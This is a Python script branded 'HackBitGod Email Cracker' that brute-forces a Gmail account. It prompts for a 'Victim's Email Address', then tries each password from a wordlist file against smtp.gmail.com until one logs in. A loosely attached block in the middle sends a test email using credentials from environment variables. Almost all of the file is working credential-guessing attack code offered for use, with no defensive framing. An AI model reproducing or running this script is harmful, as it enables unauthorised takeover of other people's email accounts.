import smtplib
import os
import time
import logging

class Color:
    def __init__(self):
        self.END = '\033[0m'
        self.BOLD = '\033[1m'
        self.YELLOW = '\033[93m'
        self.OK = '\033[92m'
        self.FAIL = '\033[91m'
        self.UNDERLINE = '\033[4m'

fa = Color()

logo = fa.YELLOW + fa.BOLD + r'''
  _____ __  __    _    ___ _        ____ ____      _    ____ _  _______ ____  
 | ____|  \/  |  / \  |_ _| |      / ___|  _ \    / \  / ___| |/ / ____|  _ \ 
 |  _| | |\/| | / _ \  | || |     | |   | |_) |  / _ \| |   | ' /|  _| | |_) |
 | |___| |  | |/ ___ \ | || |___  | |___|  _ <  / ___ \ |___| . \| |___|  _ < 
 |_____|_|  |_/_/   \_\___|_____|  \____|_| \_\/_/   \_\____|_|\_\_____|_| \_\ 
                                                                         v1.0
Coded By : Hack-BitGod  
''' + fa.END

prompt = fa.BOLD + "BitGod@Hack-BitGod:" + fa.END

print(logo)
print(prompt)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def connect_to_smtp_server():
    retries = 5
    for i in range(retries):
        try:
            smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
            smtpserver.ehlo()
            smtpserver.starttls()
            logging.info("SMTP connection established successfully.")
            return smtpserver
        except (smtplib.SMTPConnectError, smtplib.SMTPServerDisconnected) as e:
            logging.error(f"Attempt {i+1}/{retries} failed: {e}")
            time.sleep(5)
    raise Exception("Failed to connect to the SMTP server after several attempts.")

def try_login(smtpserver, user, password):
    try:
        smtpserver.login(user, password)
        return True
    except smtplib.SMTPAuthenticationError:
        return False
    except smtplib.SMTPServerDisconnected:
        logging.warning("SMTP server disconnected. Reconnecting...")
        smtpserver.quit()
        smtpserver = connect_to_smtp_server()
        return try_login(smtpserver, user, password)
    except smtplib.SMTPException as e:
        logging.error(f"SMTP error during login: {e}")
        return False

try:
    smtpserver = connect_to_smtp_server()
    
    email_user = os.getenv('EMAIL_USER')
    email_pass = os.getenv('EMAIL_PASS')
    
    smtpserver.login(email_user, email_pass)
    logging.info("Logged in successfully.")
    
    from_addr = email_user
    to_addr = "recipient_email@gmail.com"
    subject = "Test Email"
    body = "This is a test email."
    msg = f"Subject: {subject}\n\n{body}"
    
    smtpserver.sendmail(from_addr, to_addr, msg)
    logging.info("Email sent successfully.")
    
    smtpserver.quit()
    logging.info("SMTP server connection closed.")
except smtplib.SMTPAuthenticationError as auth_err:
    logging.error(f"Authentication failed: {auth_err}")
except smtplib.SMTPException as smtp_err:
    logging.error(f"SMTP error occurred: {smtp_err}")
except Exception as e:
    logging.error(f"An unexpected error occurred: {e}")

print(fa.BOLD + "HackBitGod Email Cracker" + fa.END)
print(fa.BOLD + "TRYING WITH PASSWORDS IN: psw.list" + fa.END)

user = input("Enter The Victim's Email Address: ")
passwfile = "psw.list"

try:
    with open(passwfile, "r") as file:
        for password in file:
            password = password.strip()
            try:
                smtpserver = connect_to_smtp_server()  # Reconnect for each attempt
                if try_login(smtpserver, user, password):
                    print(fa.UNDERLINE + f"Password Found: {password}" + fa.END)
                    break
                else:
                    print(fa.FAIL + f"Password Incorrect: {password}" + fa.END)
            except Exception as e:
                print(fa.FAIL + f"An error occurred: {e}" + fa.END)
finally:
    smtpserver.quit()  # Ensure connection is closed properly
